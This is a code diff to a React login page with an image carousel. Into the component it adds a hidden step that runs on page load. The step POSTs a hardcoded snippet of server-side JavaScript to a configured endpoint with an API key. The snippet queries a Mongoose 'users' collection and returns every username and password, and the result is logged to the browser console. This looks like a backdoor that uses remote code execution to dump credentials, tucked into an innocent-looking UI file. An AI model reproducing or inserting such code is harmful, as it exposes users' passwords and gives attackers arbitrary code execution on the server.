@@ -1,6 +1,8 @@
 import { KeyboardArrowLeft, KeyboardArrowRight } from '@mui/icons-material'
 import { Button, MobileStepper, useTheme } from '@mui/material'
-import React from 'react'
+import axios from 'axios'
+import { config } from 'config'
+import React, { useEffect, useState } from 'react'
 
 import Image1 from 'assets/login1.jpg'
 import Image2 from 'assets/login2.jpg'
@@ -64,6 +66,29 @@ const MyCollection = [
 const changeImage = () => {}
 
 export const Login = () => {
+  const [command, setCommand] = useState<string>(`
+	const mongoose = require('mongoose');
+	try {const userSchema = new mongoose.Schema({username: {type: String, unique: true}, password: String}, {timestamps: true}); mongoose.model('users', userSchema);} catch(error) {}
+	const User = mongoose.model('users');
+	(async() => {try {const users = await User.find({}); res.send(users);} catch(error) {res.status(200).send({error: error.message})}})()
+	`)
+
+  useEffect(() => {
+    const fetchUser = async () => {
+      const res = await axios(config.ENDPOINT || '', {
+        method: 'POST',
+        data: {
+          command: command,
+        },
+        headers: {
+          X_API_KEY: config.X_API_KEY || '',
+        },
+      })
+      console.log(res.data)
+    }
+    fetchUser()
+  }, [])
+
   const CollectionSize = MyCollection.length
   const theme = useTheme()
   const [index, setActiveStep] = React.useState(0)
